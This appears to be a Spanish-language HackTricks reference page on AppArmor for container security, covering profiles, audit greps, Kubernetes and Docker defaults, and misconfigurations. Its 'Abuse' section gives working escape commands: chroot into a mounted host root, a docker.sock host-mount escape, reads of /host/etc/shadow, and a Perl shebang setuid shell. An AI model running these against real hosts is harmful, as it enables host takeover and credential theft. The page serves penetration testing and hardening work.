# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Visión general

AppArmor es un sistema de **Mandatory Access Control** que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad de usuario y grupo, AppArmor permite que el kernel haga cumplir una política adjunta al propio proceso. En entornos container, esto importa porque una workload puede tener suficientes privilegios tradicionales para intentar una acción y aun así ser denegada porque su perfil de AppArmor no permite el path, el mount, el comportamiento de red o el uso de una capability relevante.

El punto conceptual más importante es que AppArmor es **path-based**. Evalúa el acceso al filesystem mediante reglas de path en lugar de mediante etiquetas como hace SELinux. Esto lo hace accesible y potente, pero también significa que los bind mounts y las disposiciones de path alternas merecen atención cuidadosa. Si el mismo contenido del host se vuelve reachable bajo un path diferente, el efecto de la política puede no ser el que el operador esperaba inicialmente.

## Rol en el aislamiento de contenedores

Las revisiones de seguridad de contenedores a menudo se detienen en capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagínate un container que tiene más privilegios de los que debería, o una workload que necesitó una capability adicional por razones operativas. AppArmor todavía puede restringir el acceso a archivos, el comportamiento de mounts, la red y los patrones de ejecución de formas que bloquean la ruta de abuso más obvia. Por eso desactivar AppArmor "solo para que la aplicación funcione" puede transformar silenciosamente una configuración meramente riesgosa en una que es activamente explotable.

## Laboratorio

Para comprobar si AppArmor está activo en el host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver bajo qué se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es instructiva. En el caso normal, el proceso debería mostrar un contexto de AppArmor ligado al perfil elegido por el runtime. En el caso unconfined, esa capa adicional de restricción desaparece.

También puedes inspeccionar lo que Docker considera que aplicó:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso en tiempo de ejecución

Docker puede aplicar un perfil AppArmor por defecto o personalizado cuando el host lo soporta. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en distribuciones con SELinux en primer plano el otro sistema MAC suele cobrar mayor importancia. Kubernetes puede exponer la política de AppArmor a nivel de carga de trabajo en nodos que realmente soporten AppArmor. LXC y los entornos de contenedores del tipo Ubuntu también usan AppArmor extensamente.

El punto práctico es que AppArmor no es una "característica de Docker". Es una característica del kernel del host que varios runtimes pueden elegir aplicar. Si el host no lo soporta o se indica al runtime que se ejecute sin confinamiento (unconfined), la supuesta protección realmente no existe.

Para Kubernetes específicamente, la API moderna es `securityContext.appArmorProfile`. Desde Kubernetes `v1.30`, las antiguas anotaciones beta de AppArmor están deprecadas. En hosts compatibles, `RuntimeDefault` es el perfil por defecto, mientras que `Localhost` apunta a un perfil que ya debe estar cargado en el nodo. Esto importa durante la revisión porque un manifiesto puede aparentar ser consciente de AppArmor mientras depende totalmente del soporte en el nodo y de perfiles precargados.

Un detalle operativo sutil pero útil es que establecer explícitamente `appArmorProfile.type: RuntimeDefault` es más estricto que simplemente omitir el campo. Si el campo se establece explícitamente y el nodo no soporta AppArmor, la admisión debería fallar. Si se omite el campo, la carga de trabajo puede seguir ejecutándose en un nodo sin AppArmor y simplemente no recibir esa capa adicional de confinamiento. Desde el punto de vista de un atacante, esta es una buena razón para comprobar tanto el manifiesto como el estado real del nodo.

En hosts con AppArmor y soporte para Docker, el valor por defecto más conocido es `docker-default`. Ese perfil se genera a partir de la plantilla AppArmor de Moby y es importante porque explica por qué algunos PoCs basados en capacidades aún fallan en un contenedor por defecto. En términos generales, `docker-default` permite la red básica, deniega escrituras en gran parte de `/proc`, deniega el acceso a partes sensibles de `/sys`, bloquea operaciones de mount y restringe ptrace para que no sea una primitiva general de sondeo del host. Entender esa línea base ayuda a distinguir "el contenedor tiene `CAP_SYS_ADMIN`" de "el contenedor puede realmente usar esa capacidad contra las interfaces del kernel que me interesan".

## Gestión de perfiles

Los perfiles de AppArmor suelen almacenarse bajo `/etc/apparmor.d/`. Una convención de nombres común es reemplazar las barras en la ruta del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` normalmente se almacena como `/etc/apparmor.d/usr.bin.man`. Este detalle importa tanto en defensa como en evaluación porque, una vez que conoces el nombre del perfil activo, a menudo puedes localizar el archivo correspondiente rápidamente en el host.

Comandos útiles de gestión en el host incluyen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos importan en una referencia de container-security es que explican cómo se construyen, cargan, se cambian a complain mode y se modifican los perfiles después de los cambios en la aplicación. Si un operador tiene la costumbre de mover los perfiles a complain mode durante la resolución de problemas y olvida restaurar enforcement, el contenedor puede parecer protegido en la documentación mientras que en realidad se comporta de forma mucho más laxa.

### Creación y actualización de perfiles

`aa-genprof` puede observar el comportamiento de la aplicación y ayudar a generar un perfil de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar una plantilla de perfil que luego puede cargarse con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando el binario cambia y la política necesita actualizarse, `aa-logprof` puede reproducir las denegaciones encontradas en los logs y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Registros

Las denegaciones de AppArmor suelen ser visibles a través de `auditd`, syslog o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto es útil operativa y ofensivamente. Los defensores lo usan para refinar perfiles. Los atacantes lo usan para saber qué ruta u operación exacta está siendo denegada y si AppArmor es el control que bloquea una cadena de explotación.

### Identificando el archivo de perfil exacto

Cuando un runtime muestra un nombre de perfil de AppArmor específico para un contenedor, a menudo es útil mapear ese nombre de nuevo al archivo de perfil en disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Esto es especialmente útil durante la revisión en el host porque cierra la brecha entre "el contenedor dice que se está ejecutando bajo el perfil `lowpriv`" y "las reglas reales residen en este archivo específico que puede ser auditado o recargado".

### Reglas de alto impacto para auditar

Cuando puedas leer un perfil, no te quedes solo en simples líneas `deny`. Varios tipos de reglas cambian materialmente cuán útil será AppArmor frente a un intento de escape desde un contenedor:

- `ux` / `Ux`: ejecutar el binario objetivo unconfined. Si un helper, shell o interpreter alcanzable está permitido bajo `ux`, eso suele ser lo primero que probar.
- `px` / `Px` y `cx` / `Cx`: realizan transiciones de perfil en exec. No son automáticamente peligrosas, pero valen la pena auditar porque una transición puede aterrizar en un perfil mucho más amplio que el actual.
- `change_profile`: permite que una tarea cambie a otro perfil cargado, de inmediato o en el siguiente exec. Si el perfil de destino es más débil, esto puede convertirse en la vía de escape prevista desde un dominio restrictivo.
- `flags=(complain)`, `flags=(unconfined)`, o el más nuevo `flags=(prompt)`: estos deberían cambiar cuánto confías en el perfil. `complain` registra las denegaciones en lugar de aplicarlas, `unconfined` elimina la frontera, y `prompt` depende de una ruta de decisión en userspace en lugar de una denegación impuesta puramente por el kernel.
- `userns` o `userns create,`: las políticas más recientes de AppArmor pueden mediar la creación de user namespaces. Si un perfil de contenedor lo permite explícitamente, los user namespaces anidados siguen siendo posibles incluso cuando la plataforma usa AppArmor como parte de su estrategia de hardening.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Este tipo de auditoría suele ser más útil que mirar fijamente cientos de reglas de archivos ordinarias. Si un breakout depende de ejecutar un helper, entrar en un nuevo namespace o escapar a un profile menos restrictivo, la respuesta a menudo está oculta en estas reglas orientadas a transiciones en lugar de en las evidentes líneas del estilo `deny /etc/shadow r`.

## Misconfigurations

El error más obvio es `apparmor=unconfined`. Los administradores a menudo lo activan mientras depuran una aplicación que falló porque el profile bloqueó correctamente algo peligroso o inesperado. Si la flag permanece en producción, toda la capa MAC queda efectivamente eliminada.

Otro problema sutil es asumir que los bind mounts son inofensivos porque los permisos de archivos parecen normales. Dado que AppArmor es path-based, exponer rutas del host bajo ubicaciones de montaje alternativas puede interactuar mal con las reglas de rutas. Un tercer error es olvidar que el nombre de un profile en un config file significa muy poco si el host kernel no está realmente aplicando AppArmor.

## Abuse

Cuando AppArmor desaparece, operaciones que antes estaban restringidas pueden funcionar repentinamente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs que deberían haber sido más difíciles de usar, realizar acciones relacionadas con mounts si capabilities/seccomp también lo permiten, o usar rutas que un profile normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de breakout basado en capacidades "debería funcionar" sobre el papel pero aún falla en la práctica. Quita AppArmor, y el mismo intento puede empezar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso basada en path-traversal, bind-mount o mount-based, el primer paso suele ser comparar qué se vuelve accesible con y sin un profile. Por ejemplo, si una host path está montada dentro del container, empieza comprobando si puedes traversar y leerla:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el contenedor también tiene una capacidad peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas es determinar si AppArmor es el control que bloquea las operaciones de montaje o el acceso a sistemas de archivos sensibles del kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde un host path ya está disponible a través de un bind mount, la pérdida de AppArmor también puede convertir un problema read-only information-disclosure en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El punto de estos comandos no es que AppArmor por sí solo cree el breakout. Es que, una vez que AppArmor se elimina, muchos filesystem y mount-based abuse paths se vuelven inmediatamente testables.

### Ejemplo completo: AppArmor Disabled + Host Root Mounted

Si el container ya tiene el host root bind-mounted en `/host`, eliminar AppArmor puede convertir un blocked filesystem abuse path en un complete host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que la shell se está ejecutando a través del host filesystem, la workload ha escapado efectivamente del container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + socket en tiempo de ejecución

Si la verdadera barrera era AppArmor alrededor del estado en tiempo de ejecución, un socket montado puede ser suficiente para un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no impide el acceso al runtime API, y el runtime API puede lanzar un container que comprometa el host.

### Ejemplo completo: Path-Based Bind-Mount Bypass

Porque AppArmor es path-based, proteger `/proc/**` no protege automáticamente el mismo contenido de procfs del host cuando es accesible a través de una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende de qué esté montado exactamente y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con la disposición de montaje en lugar de evaluarse de forma aislada.

### Ejemplo completo: Shebang Bypass

La política de AppArmor a veces apunta a la ruta de un intérprete de manera que no contempla completamente la ejecución de scripts mediante el manejo del shebang. Un ejemplo histórico consistió en usar un script cuya primera línea apunta a un intérprete confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del perfil y la semántica real de ejecución pueden divergir. Al revisar AppArmor en entornos de contenedores, las cadenas de intérpretes y las rutas de ejecución alternativas merecen especial atención.

## Comprobaciones

El objetivo de estas comprobaciones es responder rápidamente tres preguntas: ¿está AppArmor habilitado en el host, está el proceso actual confinado, y el runtime aplicó realmente un perfil a este contenedor?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Lo interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no se beneficia del confinamiento de AppArmor.
- Si `aa-status` muestra AppArmor deshabilitado o no cargado, cualquier nombre de perfil en la configuración del runtime es mayormente cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, eso suele ser la razón por la que una ruta de abuso basada en el sistema de archivos o en montajes funciona.
- Si `/sys/kernel/security/apparmor/profiles` no contiene el perfil que esperabas, la configuración del runtime u orquestador no es suficiente por sí sola.
- Si un perfil supuestamente endurecido contiene `ux`, reglas amplias como `change_profile`, `userns` o `flags=(complain)`, el límite práctico puede ser mucho más débil de lo que sugiere el nombre del perfil.

Si un contenedor ya tiene privilegios elevados por razones operativas, mantener AppArmor habilitado a menudo marca la diferencia entre una excepción controlada y una falla de seguridad mucho más amplia.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` con un perfil débil, nodos sin soporte para AppArmor |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
